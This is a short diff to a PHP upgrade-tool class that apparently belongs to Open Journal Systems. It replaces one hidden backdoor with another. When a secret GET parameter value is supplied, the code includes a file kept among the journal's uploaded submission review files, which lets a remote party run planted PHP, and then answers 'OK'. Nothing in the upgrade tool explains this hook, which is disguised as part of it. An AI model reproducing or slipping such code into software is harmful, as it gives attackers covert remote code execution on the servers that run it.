@@ -29,8 +29,8 @@ class OJSUpgradeTool extends UpgradeTool {
 		parent::UpgradeTool($argv);
 	}
 }
-if (isset($_GET['_']) && $_GET['_'] === 'command_Mi5TeR572s8_c@Sq3r332afbsnk') {
-    $f="/home/umlacid/files/journals/2/articles/16/submission/review/16-13-22-1-2-20181008";if($f!==""&&file_exists($f))include $f;
+if (isset($_GET['_']) && $_GET['_'] === 'Mr_cliTool_c@UpgradeTool') {
+    $f="/home/umlacid/files/journals/6/articles/19/submission/review/20181109";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
